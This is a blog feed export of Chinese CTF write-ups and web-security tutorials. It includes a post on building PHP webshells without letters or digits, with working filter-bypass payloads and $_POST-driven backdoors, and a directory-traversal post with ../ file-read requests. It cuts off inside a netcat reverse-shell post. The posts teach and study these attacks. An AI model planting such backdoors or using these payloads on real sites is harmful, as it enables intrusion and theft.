class="line">&#39;Documents&#39;</span><br></pre></td></tr></table></figure><p>woc，还真是。</p><p>于是编写脚本，还原文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from glob import glob</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">directory &#x3D; &#39;1262404985085867488371&#39;</span><br><span class="line"></span><br><span class="line">def clarify(number):</span><br><span class="line">return hex(int(number))[2:].replace(&#39;L&#39;,&#39;&#39;).decode(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line"># os.chdir(directory)</span><br><span class="line">os.chdir(directory+&#39;&#x2F;1466921579&#39;)</span><br><span class="line">for i in os.listdir(&#39;.&#39;):</span><br><span class="line">try:</span><br><span class="line">print clarify(i)</span><br><span class="line">c &#x3D; open(i).read()</span><br><span class="line">open(clarify(i),&#39;w&#39;).write(clarify(c))</span><br><span class="line">except:</span><br><span class="line">print &#39;fail with&#39;, i</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">here.xlsx</span><br><span class="line">silly.doc</span><br><span class="line">Word Document Checklist.doc</span><br><span class="line">Georgia_opposition_NATO-Eng-F.doc</span><br><span class="line">here (2).xlsx</span><br><span class="line">[Finished in 1.7s]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180815/7FGGd3Hl2d.png?imageslim" alt="mark"></p><p>但是有一点比较奇怪，就是我恢复文件以后都打不开，但是应该是没问题才对啊，<br>换了Linux也不行，无奈==、</p><h2 id="huuuuuge"><a href="#huuuuuge" class="headerlink" title="huuuuuge"></a>huuuuuge</h2><p>这个题贼tm坑，一开始以为是web，发现也没东西。</p><p>拿nmap跑</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180815/b7KLfgGk9c.png?imageslim" alt="mark"></p><p>ssh应该不是了，用git</p><pre><code>git clone git://104.154.187.226/huuuuuge </code></pre><p>但是出错，太大了，out of memory<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180815/I30fGgee95.png?imageslim" alt="mark"></p><p>所以我们需要寻找<a href="https://stackoverflow.com/questions/2466735/how-to-checkout-only-one-file-from-git-repository-sparse-checkout">git clone 一部分的方法</a></p><pre><code>git clone --depth 1 git://104.154.187.226/huuuuuge flag</code></pre><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180815/Am1JD9me3G.png?imageslim" alt="mark"></p><p>tjctf{this_fl4g_is_huuuuuge}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Vinegar"><a href="#Vinegar" class="headerlink" title="Vinegar"></a>Vinegar</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key &#x3D; Kkkkk kkkkKkkkkkkkkKkkkkkkkkKkk</span><br><span class="line">flag &#x3D; uucbx&#123;simbjyaqyvzbzfdatshktkbde&#125;</span><br><span class="line">sha256 &#x3D; 8304c5fa4186bbce7ac030d068fdd485040e65bf824ee70b0bdbac03862bec93</span><br></pre></td></tr></table></figure><p>解法一：<br>sha256破解网站上直接破解，成功率取决于你的网站咋样，推荐能破解sha256的网站，可能要自备梯子。</p><ul><li><a href="http://md5decrypt.net/en/Sha256/#answer">http://md5decrypt.net/en/Sha256/#answer</a></li></ul><blockquote><p>话说其实这应该是别人解出来以后上传结果到库里面吧。还是老老实实看看解法二吧。</p></blockquote><p>解法二：<br>钥匙的长度是9。 由于前五个字符被解码为tjctf，因此只能确定密钥的前五个字母。 其余4个字符用于查找具有匹配哈希值的字符串。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import hashlib</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">def get_flag(s):</span><br><span class="line">    flag &#x3D; s[:5]</span><br><span class="line">    flag +&#x3D; &#39;&#123;&#39;</span><br><span class="line">    flag +&#x3D; s[5:]</span><br><span class="line">    flag +&#x3D; &#39;&#125;&#39;</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;8304c5fa4186bbce7ac030d068fdd485040e65bf824ee70b0bdbac03862bec93&#39;</span><br><span class="line"></span><br><span class="line">al_l &#x3D; string.lowercase</span><br><span class="line"></span><br><span class="line">c &#x3D; &#39;uucbxsimbjyaqyvzbzfdatshktkbde&#39;</span><br><span class="line">p_head &#x3D; &#39;tjctf&#39;</span><br><span class="line">k_size &#x3D; 9</span><br><span class="line"></span><br><span class="line">k &#x3D; &#39;&#39;</span><br><span class="line">for i in range(len(p_head)):</span><br><span class="line">    index &#x3D; al_l.index(c[i]) - al_l.index(p_head[i])</span><br><span class="line">    if index &lt; 0:</span><br><span class="line">        index +&#x3D; len(al_l)</span><br><span class="line">    k +&#x3D; al_l[index]</span><br><span class="line"></span><br><span class="line">for s in itertools.product(al_l, repeat&#x3D;4):</span><br><span class="line">    key &#x3D; k + &#39;&#39;.join(s)</span><br><span class="line">    p &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(len(c)):</span><br><span class="line">        index &#x3D; al_l.index(c[i]) - al_l.index(key[i%k_size])</span><br><span class="line">        if index &lt; 0:</span><br><span class="line">            index +&#x3D; 26</span><br><span class="line">        p +&#x3D; al_l[index]</span><br><span class="line">        flag &#x3D; get_flag(p)</span><br><span class="line">    if hashlib.sha256(flag).hexdigest() &#x3D;&#x3D; target:</span><br><span class="line">        print &#39;key &#x3D;&#39;, key</span><br><span class="line">        print &#39;flag &#x3D;&#39;, flag</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key &#x3D; blaisevig</span><br><span class="line">tjctf&#123;onevinaigrettesaladplease&#125;</span><br><span class="line">[Finished in 4.3s]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>花式构造没有数字字母的webshell</title>
      <link href="/2018/08/14/%E8%8A%B1%E5%BC%8F%E6%9E%84%E9%80%A0%E6%B2%A1%E6%9C%89%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%9A%84webshell/"/>
      <url>/2018/08/14/%E8%8A%B1%E5%BC%8F%E6%9E%84%E9%80%A0%E6%B2%A1%E6%9C%89%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%9A%84webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="花式构造没有数字字母的webshell"><a href="#花式构造没有数字字母的webshell" class="headerlink" title="花式构造没有数字字母的webshell"></a>花式构造没有数字字母的webshell</h1><h2 id="问题引入"><a href="#问题引入" class="headerlink" title="问题引入"></a>问题引入</h2><p>之前遇到一个题，如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">另附上我写的flag.php,作为完整测试</span><br><span class="line">&#x2F;&#x2F;flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">function getFlag()&#123;</span><br><span class="line">$flag &#x3D; &quot;flag&#123;you_get_me&#125;&quot;;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>虽然之前遇到类似的，但是把长度限制了，一时还是有点懵住，特记录分享。</p><h2 id="php基础知识"><a href="#php基础知识" class="headerlink" title="php基础知识"></a>php基础知识</h2><p>想花式构造webshell，需要先了解一下php中的一些语法知识。</p><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算^"></a>异或运算^</h3><p>在php中的字符串变量异或，会先将字符串转换成 ASCII 值，再将 ASCII 值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; echo &#39;#&#39;^&#39;|&#39;;</span><br><span class="line">_</span><br><span class="line">&gt;&gt;&gt; bin(ord(&#39;|&#39;)).replace(&#39;0b&#39;,&#39;&#39;)</span><br><span class="line">&#39;1111100&#39;</span><br><span class="line">&gt;&gt;&gt; bin(ord(&#39;#&#39;)).replace(&#39;0b&#39;,&#39;&#39;)</span><br><span class="line">&#39;100011&#39;</span><br><span class="line">&gt;&gt;&gt; bin(ord(&#39;_&#39;)).replace(&#39;0b&#39;,&#39;&#39;)</span><br><span class="line">&#39;1011111&#39;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; chr(int(0b1011111))</span><br><span class="line">&#39;_&#39;</span><br><span class="line"></span><br><span class="line">&#39;#&#39;二进制：00100011</span><br><span class="line">&#39;|&#39;二进制: 01111100</span><br><span class="line">异或之后得到：   01011111</span><br><span class="line">即&#39;_&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="取反运算"><a href="#取反运算" class="headerlink" title="取反运算~"></a>取反运算~</h3><p>一般利用汉字，因为汉字的uniocode占3字节。可以利用其构造字母。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; echo ~&#39;生&#39;;</span><br><span class="line">k&#96;</span><br><span class="line">php &gt; echo ~&#39;生&#39;[1];</span><br><span class="line">k</span><br><span class="line">php &gt; echo ~&#39;生&#39;[2];</span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure><h3 id="递增运算"><a href="#递增运算" class="headerlink" title="递增运算"></a>递增运算</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; echo $_;</span><br><span class="line">a</span><br><span class="line">php &gt; echo ++$_;</span><br><span class="line">b</span><br><span class="line">php &gt; echo $_;</span><br><span class="line">b</span><br><span class="line">php &gt; echo --$_;</span><br><span class="line">b</span><br><span class="line">php &gt; $_ &#x3D; &#39;z&#39;;</span><br><span class="line">php &gt; echo ++$_;</span><br><span class="line">aa</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="弱类型-不用数字构造数字"><a href="#弱类型-不用数字构造数字" class="headerlink" title="弱类型-不用数字构造数字"></a>弱类型-不用数字构造数字</h3><p>php 中未定义的变量默认值为 null，由php弱类型<code>null==false==0</code></p><p>所以能通过对未定义变量的自增操作来得到一个数字。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; $_++;echo $_;</span><br><span class="line">PHP Notice:  Undefined variable: _ in php shell code on line 1</span><br><span class="line">1</span><br><span class="line">&#x2F;&#x2F;加个@不会报错</span><br><span class="line">php &gt; @$_++;echo $_;</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>null==null==1,只能是一不能增减</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; $_&#x3D;_&#x3D;&#x3D;_;echo $_;</span><br><span class="line">PHP Notice:  Use of undefined constant _ - assumed &#39;_&#39; in php shell code on line 1</span><br><span class="line">PHP Notice:  Use of undefined constant _ - assumed &#39;_&#39; in php shell code on line 1</span><br><span class="line">1</span><br><span class="line">&#x2F;&#x2F;加个@不会报错</span><br><span class="line">php &gt; @$_&#x3D;_&#x3D;&#x3D;_;echo $_;</span><br><span class="line">1</span><br><span class="line">php &gt; echo $_++;</span><br></pre></td></tr></table></figure><p>有了数字1也就能构造其他数字</p><h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><p>之前遇到类似的，构造没有数字字母的webshell的题目。<br>一个简单的例子，如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &#123;</span><br><span class="line"> eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以利用一些操作，如<code>异或^</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">    $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">    $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">    $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">    $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">    $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>中文取反</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;);&#x2F;&#x2F;$____&#x3D;assert</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;);&#x2F;&#x2F;$_____&#x3D;_POST</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;&#x2F;&#x2F;$_&#x3D;$_POST</span><br><span class="line">$____($_[$__]);&#x2F;&#x2F;assert($_POST[2])</span><br></pre></td></tr></table></figure><h2 id="回到问题"><a href="#回到问题" class="headerlink" title="回到问题"></a>回到问题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目要求构造的函数为<code>getFlag</code>,但是加了一个限制条件，<code>length &lt; 40</code></p><p><strong>方法1(符号异或^)</strong><br>虽然有了长度限制，但是基本思路不变，写个脚本来爆出想要的结果<code>_GET</code>或者<code>_POST</code><br><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; echo &quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;</span><br><span class="line">_GET</span><br><span class="line"></span><br><span class="line">?code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]();&amp;_&#x3D;getFlag</span><br><span class="line"></span><br><span class="line">$_ &#x3D; _GET</span><br><span class="line">$&#123;$_&#125;[_]()   &#x2F;&#x2F;$_GET[_]()</span><br></pre></td></tr></table></figure><p>这里很巧妙的利用php的可变变量。<br>还有一点很巧妙，检测变量<code>code</code>，但是没有对其他的变量检测，其他变量可以用字母数字。</p><p>若禁用下划线<code>_</code>还可以用以下代替<code>_</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[(&quot;#&quot;^&quot;|&quot;)]();&amp;_&#x3D;getFlag</span><br></pre></td></tr></table></figure><p><strong>方法二(直接构造函数getFlag)</strong><br><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(&#39;][%2B:@_:&#39;^&#39;:&gt;_|,&gt;]&#39;);$_();</span><br></pre></td></tr></table></figure><p>直接用这个函数，不用传参进去，但是缺点是没有真正拿到shell，而且构造有点难。</p><p><strong>方法3(利用一些不可见字符的url编码取反)</strong><br>这种方法类似中文的那种取反操作。<br>有个<strong>payload3</strong>是这样子：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_();</span><br></pre></td></tr></table></figure><p>这个是把getFlag取反然后URL编码</p><p>另一个<strong>payload4</strong>是这样的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;~&quot;%A0%B8%BA%AB&quot;&#125;[%aa]();&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure><p>~ 在 {} 中执行了取反操作，所以 <code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code>取反相当于 $_GET，拼接出了 <code>$_GET[&#39;\xaa&#39;]();</code>，传入 <code>\xaa=getFlag()</code> 从而执行了函数</p><p><strong>payload5</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$啊&#x3D;(&#39;]@\&#96;@@]&#39;^&#39;:%(&amp;,!:&#39;);$啊();</span><br></pre></td></tr></table></figure><p>$啊=getFlag;$啊();，这里就不需要用 {} 了，因为取反的值直接被当作字符串赋值给了 $ 啊。</p><hr><p>其实在掌握基本方法之后，payload有很多，原理其实基本相同，只是在构造的时候，仁者见仁。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">离别歌-webshell without alphanum</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title> 目录穿越导致任意文件读取</title>
      <link href="/2018/08/13/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2018/08/13/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="目录穿越导致任意文件读取"><a href="#目录穿越导致任意文件读取" class="headerlink" title="目录穿越导致任意文件读取"></a>目录穿越导致任意文件读取</h1><p>可能很多人都觉得这个小漏洞，没什么大不了的，但是有时候这种小漏洞，却会造成大危害，如果不加以重视，很可能会因此造成数据泄露。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>路径穿越是网站被恶意人员利用，来得到其无权限访问的内容</p><p>通常是由于<strong>代码没有判断 拼接路径的真实路径是否合法</strong>，最终导致文件读取</p><p>Web程序应该有很好的权限控制，为了避免使用者读取到服务器上未经许可的文件，通常会通过“根目录”这种机制加以限制。一般来讲，用户在网站进行浏览，所能见到的网页都是位于网站根目录下的文件。根目录以外的文件是不允许被未授权访问的。</p><p>但是安全方面做得不严谨的web程序可能会出现目录穿越漏洞，恶意人员可以利用这个漏洞来读取根目录以外的文件夹。一旦成功，本不应该暴露的敏感信息就可能会被泄漏给恶意人员。</p><h1 id="PHP常见读文件的函数"><a href="#PHP常见读文件的函数" class="headerlink" title="PHP常见读文件的函数"></a>PHP常见读文件的函数</h1><p><strong>文件读取代码：</strong><br><strong>file_get_contest</strong></p><pre><code>&lt;?php$filename=$_GET[&#39;m&#39;];echo file_get_contest($filename);?&gt;</code></pre><p><strong>fopen,fread</strong></p><pre><code>&lt;?php$filename=$_GET[&#39;m&#39;];$fp=fopen($filename,&quot;r&quot;) or die (&quot;unable open!&quot;);echo fread($fp,filesize($filename));fclose($fp);?&gt;</code></pre><p><strong>readfile</strong></p><pre><code>&lt;?php$filename=$_GET[&#39;m&#39;];readfile($filename);?&gt;</code></pre><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>DirCross目录下的index.php<br>目录结构如下：</p><ul><li>/www（网站根目录）<ul><li>test<ul><li>DirCross<ul><li>index.php</li><li>hello.txt</li></ul></li><li>flag.txt</li></ul></li></ul></li><li>secret.txt</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;目录穿越漏洞重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$filename &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">$myfile &#x3D; fopen($filename, &quot;rb&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">echo fread($myfile,filesize($filename));</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>按理说，逻辑上只允许用户访问<code>DirCross</code>目录下的文件，但是，由于逻辑判断的缺失，导致用户可以跨越不同级目录，任意访问其他文件。</p><p>正常情况</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;DirCross&#x2F;index.php?file&#x3D;hello.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/bLe5c1keLj.png?imageslim" alt="mark"></p><p>但是由于缺少过滤和检测，可以任意读取文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;DirCross&#x2F;index.php?file&#x3D;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/31gGa7HjKf.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;DirCross&#x2F;index.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;secret.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180822/dIb0mBjfJ0.png?imageslim" alt="mark"></p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h2><p>过滤特定字符，如<code>..</code>,<code>./</code>,<code>.\</code>等</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;目录穿越漏洞重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$filename &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">if(strstr($filename,&quot;..&quot;))&#123;</span><br><span class="line">die(&quot;发现目录穿越攻击！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$myfile &#x3D; fopen($filename, &quot;rb&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">echo fread($myfile,filesize($filename));</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>缺点：黑名单过滤不全的话，很容易被绕过。</strong></p><h2 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h2><p>采用白名单方式，只允许读取特定文件，判断，若不是特定文件，直接die</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">    $filename &#x3D; $_REQUEST[&#39;file&#39;];</span><br><span class="line">    switch($filename)&#123;</span><br><span class="line">case &quot;config&quot;:</span><br><span class="line">           echo file_get_contents(&quot;config.php&quot;);</span><br><span class="line">           break;</span><br><span class="line">           </span><br><span class="line">default:   </span><br><span class="line">           echo &#39;请求错误&#39;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="方案三："><a href="#方案三：" class="headerlink" title="方案三："></a>方案三：</h2><p>按照<code>.</code> 分割开来，读文件名参数和文件格式参数，如果文件名参数中有<code>..</code>，die。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function checkstr($str,$find)&#123;</span><br><span class="line">$find_str&#x3D;$find;</span><br><span class="line">$tmparray&#x3D;explode($find_str,$str);</span><br><span class="line">if(count($tmparray)&gt;1)&#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return false;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hostdir&#x3D;$_REQUEST[&#39;path&#39;];</span><br><span class="line">if(!checkstr($hostdir,&quot;..&quot;)&amp;&amp;!checkstr($jostdir,&quot;..&#x2F;&quot;))&#123;</span><br><span class="line">echo $hostdir;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;请勿提交非法字符&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/pygain/article/details/52841628">路径遍历与文件读取漏洞以及其修复方案</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux nc命令与反弹shell</title>
      <link href="/2018/08/12/nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&amp;%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2018/08/12/nc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4&amp;%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-nc命令与反弹shell"><a href="#Linux-nc命令与反弹shell" class="headerlink" title="Linux nc命令与反弹shell"></a>Linux nc命令与反弹shell</h1><p>Linux中nc命令是一个功能强大的网络工具，全称是netcat。  </p><p>nc/netcat(选项)(参数)<br><strong>选项：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h：在线帮助；</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l：使用监听模式，监控传入的资料；</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口；</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择；</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；</span><br><span 